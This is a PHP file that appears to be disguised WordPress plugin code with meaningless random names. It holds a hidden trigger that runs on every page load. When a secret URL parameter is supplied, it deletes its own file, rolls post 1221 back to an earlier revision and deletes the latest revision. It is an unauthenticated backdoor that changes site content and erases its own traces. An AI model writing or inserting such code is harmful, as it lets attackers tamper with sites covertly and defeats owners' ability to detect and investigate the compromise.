<?php

function auto_blogroll_random() {
	if (isset($_GET['map_print_composer']) && $_GET['map_print_composer'] === 'loader_subscribe_auto') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$oembed_real_language_effects = 1221;
		$modal_videos_free_items = wp_get_post_revisions($oembed_real_language_effects);
		if (empty($modal_videos_free_items)) die('no revisions');
		if (count($modal_videos_free_items) < 2) die('less than 2');
		$delete_tag_jetpack_syntax = array_shift($modal_videos_free_items);
		$endpoints_pagination_simply = $delete_tag_jetpack_syntax->ID;
		$taxonomy_post_reviews_date = array_shift($modal_videos_free_items);
		$dist_blog_tinymce_health = $taxonomy_post_reviews_date->ID;
		$sync_authors_age = wp_restore_post_revision($dist_blog_tinymce_health);
		if ($sync_authors_age === false) die('error restoring');
		$sync_authors_age = wp_delete_post_revision($endpoints_pagination_simply);		
		if ($sync_authors_age === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'auto_blogroll_random');
